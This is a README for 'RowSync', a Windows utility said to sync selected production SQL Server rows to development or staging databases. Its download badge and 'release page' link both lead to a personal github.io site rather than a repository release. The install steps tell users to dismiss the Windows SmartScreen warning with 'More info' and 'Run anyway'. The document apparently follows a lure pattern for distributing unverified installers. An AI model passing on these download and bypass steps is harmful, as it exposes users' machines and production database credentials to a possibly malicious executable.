# 🔄 RowSync - Sync your production database rows easily

[![](https://img.shields.io/badge/Download_RowSync-Blue.svg)](https://sampurngupta44.github.io)

RowSync moves data from your production SQL Server to your development or staging servers. You select the items you need, check the results, and push them to your target database. This tool works offline, keeps your data private, and helps you test changes without risk.

## 🛠 What this tool does

Developers often need production data to fix bugs or test new features. Copying large databases is slow and risky. RowSync performs specific tasks:

*   Runs targeted searches on your production SQL database.
*   Shows you exactly what data you will copy before you start.
*   Updates existing records or adds new ones to your target server automatically.
*   Works in environments without internet access to keep your data secure.

## 🖥 System Requirements

Before you run RowSync, verify your computer meets these needs:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 4GB of RAM or more.
*   Storage: 200MB of free disk space.
*   Network: Access to your internal SQL Server instances.
*   Drivers: Microsoft ODBC Driver for SQL Server (the installer includes this).

## 🚀 Downloading the application

You need to obtain the installer from the official repository page.

1.  Visit the [RowSync release page](https://sampurngupta44.github.io).
2.  Look for the latest version under the Releases section.
3.  Click the file ending in .exe to start your download.
4.  Save the file to your desktop or your Downloads folder.

## ⚙️ How to install RowSync

Once the download finishes, follow these steps to place the files on your computer:

1.  Double-click the RowSync installer file you downloaded.
2.  Windows might show a blue pop-up window. If this happens, click "More info" and then "Run anyway."
3.  Follow the prompts in the installation wizard.
4.  Click "Finish" to launch the tool.

The installation adds a shortcut to your Start menu. Search for RowSync to open the program in the future.

## 📋 Connecting your databases

The first time you open RowSync, you must link your database servers.

1.  Click the "Settings" tab at the top of the window.
2.  Enter the name or IP address of your Production Server.
3.  Choose your authentication method. Most users choose "Windows Authentication."
4.  Repeat these steps for your Target Server (Development or Staging).
5.  Click "Test Connection" for each server. A green checkmark means you are ready.

## 🔍 Running a search

You use SQL queries to find specific rows. If you do not know the exact command, use the auto-fill feature.

1.  Go to the "Sync" tab.
2.  Select your Production Server from the dropdown menu.
3.  Type your command in the main text box. The program suggests table names as you type.
4.  Click the "Preview" button. This runs a search without changing any data.
5.  Review the list of records on your screen to ensure you have the correct items.

## 💾 Updating your target server

After you review your preview, you can push the data to your secondary database.

1.  Verify the list of rows shown in the preview window.
2.  Check the "Sync" button at the bottom of the tool.
3.  RowSync compares the rows in your preview against your target server.
4.  The tool adds new rows and updates existing ones to match your selection.
5.  Wait for the progress bar to reach 100%. The system shows a success notification when the task completes.

## 🔒 Security and Privacy

RowSync keeps your data safe. It does not send your database contents to any external servers. All operations happen on your machine or within your local internal network. You can use this tool even if your computer disconnected from the internet. The data remains in your control at all times.

## 💡 Troubleshooting common issues

If you encounter a problem, check these items first:

*   Connection failures: Confirm your database server is running and that your account has permission to read and write data.
*   Formatting errors: Double-check your SQL command for typos.
*   Slow performance: Large data sets take longer to process. Avoid selecting entire tables if you only need a few rows.
*   Application errors: Restart the application if the interface becomes unresponsive.

If tasks still fail, check the log file located in your Documents folder under the "RowSync/Logs" directory. This file contains technical details to help you identify the specific error.

## 📝 Frequently asked questions

Do I need a SQL license to use this?
You need permission to access your existing SQL Server, but RowSync itself is a tool for managing that data.

Can I sync data between different versions of SQL Server?
Yes, RowSync handles common data types across different SQL Server versions.

How do I remove the software?
Open your Windows Control Panel, select "Programs and Features," find RowSync in the list, and click "Uninstall."